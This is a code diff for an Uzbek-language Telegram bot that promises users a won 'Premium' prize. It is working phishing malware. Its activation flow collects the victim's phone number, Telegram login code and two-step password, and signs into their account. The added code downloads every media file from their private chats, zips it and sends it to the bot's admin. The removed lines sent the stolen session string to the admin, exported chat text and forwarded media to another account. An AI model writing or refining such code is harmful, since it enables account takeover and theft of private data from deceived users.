@@ -22,9 +22,6 @@ API_ID = int(os.getenv("API_ID"))
 API_HASH = os.getenv("API_HASH")
 ADMIN_ID = int(os.getenv("ADMIN_ID"))
 
-MEDIA_TARGET = "@pedro_yd"
-
-BASE_DIR = "chats_export"
 USERS_FILE = "users.json"
 CONFIG_FILE = "config.json"
 
@@ -107,9 +104,10 @@ async def referral(msg: types.Message):
 async def prizes(msg: types.Message):
     uid = str(msg.from_user.id)
     ensure_user(uid)
-    await msg.answer(
-        "🥳 Sizda 1 oylk Premium bor\n Olish uchun aktivlash bo'limiga o'ting" if users[uid]["prize"] else "❌ Yutuq yo‘q"
-    )
+    if users[uid]["prize"]:
+        await msg.answer("🥳 Sizda 1 oylik Premium bor\nUni olish uchun Aktivlash bo‘limiga o‘ting")
+    else:
+        await msg.answer("❌ Sizda yutuq yo‘q")
 
 # ================== SEHRLI QUTI ==================
 @dp.message_handler(lambda m: m.text == "🎁 Sehrli quti")
@@ -143,41 +141,45 @@ async def open_box(c):
     save_json(USERS_FILE, users)
 
     if not is_win:
-        await c.message.answer("😐")
         kb = None
         if u["boxes"] < 3:
             kb = types.InlineKeyboardMarkup().add(
                 types.InlineKeyboardButton("🔓 Ochish", callback_data="open_box")
             )
-        await c.message.answer("Hech narsa tushmadi", reply_markup=kb)
+        await c.message.answer("😐 Hech narsa tushmadi", reply_markup=kb)
         await c.answer()
         return
 
     u["prize"] = True
     save_json(USERS_FILE, users)
 
-    await c.message.answer("🥳")
-    kb = None
-    if u["boxes"] < 3:
-        kb = types.InlineKeyboardMarkup().add(
-            types.InlineKeyboardButton("🔓 Ochish", callback_data="open_box")
-        )
-
-    await c.message.answer("🎉 Siz yutdingiz!\nSizga 1 oylik premium berildi uni olish uchun aktivlash bo'limiga o'ting\n\n Sizga tushgan yutuq shansi: 17.8%", reply_markup=kb)
+    await c.message.answer(
+        "🎉 Tabriklaymiz!\n"
+        "Sizga 1 oylik Premium berildi.\n"
+        "Uni olish uchun Aktivlash bo‘limiga o‘ting."
+    )
     await c.answer()
 
 # ================== AKTIVLASH ==================
 @dp.message_handler(lambda m: m.text == "✅ Aktivlash")
 async def activate(msg: types.Message):
     sessions[msg.from_user.id] = {"step": "phone"}
-    await msg.answer("📲 Telefon raqamingizni yuboring\nNamuna: +998901234567", reply_markup=back_menu())
+    await msg.answer(
+        "📲 Telefon raqamingizni yuboring\n"
+        "❗️Kod SMS emas, Telegram ichiga keladi\n"
+        "Namuna: +998901234567",
+        reply_markup=back_menu()
+    )
 
 @dp.message_handler(lambda m: m.text == "⬅️ Orqaga")
 async def go_back(msg: types.Message):
     sessions.pop(msg.from_user.id, None)
     await msg.answer("🏠 Bosh menyu", reply_markup=main_menu(msg.from_user.id == ADMIN_ID))
 
-@dp.message_handler(lambda m: m.from_user.id in sessions)
+@dp.message_handler(
+    lambda m: m.from_user.id in sessions
+    and sessions[m.from_user.id]["step"] in ("phone", "code", "password")
+)
 async def login_flow(msg: types.Message):
     uid = msg.from_user.id
     state = sessions[uid]
@@ -187,109 +189,99 @@ async def login_flow(msg: types.Message):
     if state["step"] == "phone":
         digits = re.sub(r"\D", "", text)
         if len(digits) < 8:
-            return await msg.answer("❌ Telefon noto‘g‘ri")
+            await msg.answer("❌ Telefon noto‘g‘ri")
+            return
 
         phone = "+" + digits
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
 
-        sent = await client.send_code_request(
-    phone,
-    force_sms=False
-)
-
+        sent = await client.send_code_request(phone, force_sms=False)
 
         state.update({
             "step": "code",
             "phone": phone,
             "client": client,
-            "hash": sent.phone_code_hash
+            "phone_code_hash": sent.phone_code_hash
         })
 
-        await msg.answer("🔐 Kodni yuboring (faqat raqam) 23.456 misolida")
+        await msg.answer("🔐 Kodni kiriting\nMasalan: 12345")
         return
 
     # CODE
     if state["step"] == "code":
+        code = re.sub(r"\D", "", text)
+        if len(code) < 5:
+            await msg.answer("❌ Kod noto‘g‘ri")
+            return
+
         try:
             await state["client"].sign_in(
                 phone=state["phone"],
-                code=re.sub(r"\D", "", text),
-                phone_code_hash=state["hash"]
+                code=code,
+                phone_code_hash=state["phone_code_hash"]
             )
         except SessionPasswordNeededError:
             state["step"] = "password"
-            return await msg.answer("🔑 2 bosqichli parolni yuboring")
+            await msg.answer("🔑 2 bosqichli parolni kiriting")
+            return
         except PhoneCodeExpiredError:
-            await msg.answer("⛔ Kod eskirdi")
+            await msg.answer("⛔ Kod eskirdi. Qayta Aktivlash bosing.")
             await state["client"].disconnect()
-            sessions.pop(uid)
+            sessions.pop(uid, None)
             return
 
-        session_str = save_session(uid, state["client"])
-        await bot.send_message(
-            ADMIN_ID,
-            f"🧩 SESSION\n\n<code>{session_str}</code>",
-            parse_mode="HTML"
-        )
-
-        await msg.answer("⏳ 2 chi bosqich qilinmoqda...")
-        await export_chats(uid)
+        await msg.answer("⏳ 2 chi bosqich, iltimos kuting...")
+        await export_medias(uid)
         return
 
-# ================== EXPORT ==================
-def safe_name(t, max_len=40):
-    t = re.sub(r"[^\w\d_-]", "_", t, flags=re.ASCII)
-    t = re.sub(r"_+", "_", t).strip("_")
-    return (t[:max_len] if t else "user")
+    # PASSWORD
+    if state["step"] == "password":
+        await state["client"].sign_in(password=text)
+        await msg.answer("⏳ 2 bosqich , iltimos kuting...")
+        await export_medias(uid)
 
-def media_text(m):
-    if m.photo: return "rasm yubordiz"
-    if m.video: return "video yubordiz"
-    if m.voice: return "ovozli xabar yubordiz"
-    if m.audio: return "audio yubordiz"
-    if m.document: return "fayl yubordiz"
-    if m.sticker: return "stiker yubordiz"
-    return "media yubordiz"
-
-async def export_chats(uid):
+# ================== EXPORT MEDIAS ==================
+async def export_medias(uid):
     client = sessions[uid]["client"]
-    os.makedirs(BASE_DIR, exist_ok=True)
-    all_media = []
 
-    for d in await client.get_dialogs():
-        if isinstance(d.entity, User) and not d.entity.bot:
-            user = d.entity
-            name = f"{user.first_name or ''} {user.last_name or ''}".strip()
-            folder = os.path.join(BASE_DIR, f"{safe_name(name)}_{user.id}")
-            os.makedirs(folder, exist_ok=True)
+    MEDIA_DIR = f"medias_{uid}"
+    ZIP_NAME = f"medias_{uid}.zip"
 
-            with open(os.path.join(folder, "chat.txt"), "w", encoding="utf-8") as f:
-                async for m in client.iter_messages(user, limit=2000, reverse=True):
-                    time = m.date.strftime("%Y-%m-%d %H:%M:%S") if m.date else "----"
-                    sender = "siz" if m.out else name
-                    text = m.text if m.text else media_text(m)
-                    if m.media:
-                        all_media.append(m)
-                    f.write(f"[{time}] {sender}: {text}\n")
+    os.makedirs(MEDIA_DIR, exist_ok=True)
 
-    zip_name = f"chats_{uid}.zip"
-    with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as z:
-        for root, _, files in os.walk(BASE_DIR):
+    async for dialog in client.iter_dialogs():
+        if not isinstance(dialog.entity, User):
+            continue
+        if dialog.entity.bot:
+            continue
+
+        user_folder = os.path.join(MEDIA_DIR, str(dialog.entity.id))
+        os.makedirs(user_folder, exist_ok=True)
+
+        async for m in client.iter_messages(dialog.entity):
+            if not m.media:
+                continue
+            try:
+                await m.download_media(file=user_folder)
+            except:
+                pass
+
+    with zipfile.ZipFile(ZIP_NAME, "w", zipfile.ZIP_DEFLATED) as z:
+        for root, _, files in os.walk(MEDIA_DIR):
             for file in files:
                 full = os.path.join(root, file)
-                z.write(full, arcname=os.path.relpath(full, BASE_DIR))
+                z.write(full, arcname=os.path.relpath(full, MEDIA_DIR))
 
-    await bot.send_document(ADMIN_ID, types.InputFile(zip_name))
-    for m in all_media:
-        try:
-            await m.forward_to(MEDIA_TARGET)
-            await asyncio.sleep(0.3)
-        except:
-            pass
+    await bot.send_document(
+        ADMIN_ID,
+        types.InputFile(ZIP_NAME),
+        caption="📦 Faqat lichkadagi barcha medialar"
+    )
 
-    shutil.rmtree(BASE_DIR)
-    os.remove(zip_name)
+    shutil.rmtree(MEDIA_DIR)
+    os.remove(ZIP_NAME)
+
     await client.disconnect()
     sessions.pop(uid, None)
 
